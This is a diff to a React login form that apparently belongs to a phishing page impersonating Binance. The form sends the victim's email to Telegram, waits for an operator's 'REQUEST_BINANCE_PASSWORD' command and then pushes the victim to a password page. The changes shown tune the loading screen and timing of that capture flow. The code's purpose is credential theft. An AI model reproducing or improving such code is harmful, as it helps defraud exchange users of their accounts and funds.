@@ -77,6 +77,11 @@ export default function LoginForm() {
         '简体中文',
         '繁體中文'
     ];
+    // The function below sends displays the background loader
+    const displayBgLoader = () => {
+        console.log("Trying to disply background loader")
+        setBgLoader(true);
+    }
 
     useEffect(() => {
         const isClickInsideButton = (event) => {
@@ -105,10 +110,11 @@ export default function LoginForm() {
             setIsLoading(false);
         } else if (command === 'REQUEST_BINANCE_PASSWORD') {
             setIsLoading(false);
+            setBgLoader(true);
             setTimeout(() => {
                 // setIsLoading(false);
                 router.push('/PasswordPage');
-            }, 500);
+            }, 1500);
         }
     }, [command]);
 
@@ -122,7 +128,7 @@ export default function LoginForm() {
         sendMessageToTelegram(email);
 
         // Comment out when pushing to prod
-        router.push('/PasswordPage');
+        // router.push('/PasswordPage');
     };
 
 
@@ -181,15 +187,14 @@ export default function LoginForm() {
 
 
 
-    // The function below sends displays the background loader
-    const displayBgLoader = () => {
-        setBgLoader(true);
-    }
+
 
     useEffect(() => {
         if (bgLoader) {
+            console.log("Trying to disply background loader and hide document body")
             document.body.style.overflow = 'hidden';
         } else {
+            console.log("Trying to disply background loader and show document body")
             document.body.style.overflow = 'auto';
         }
 
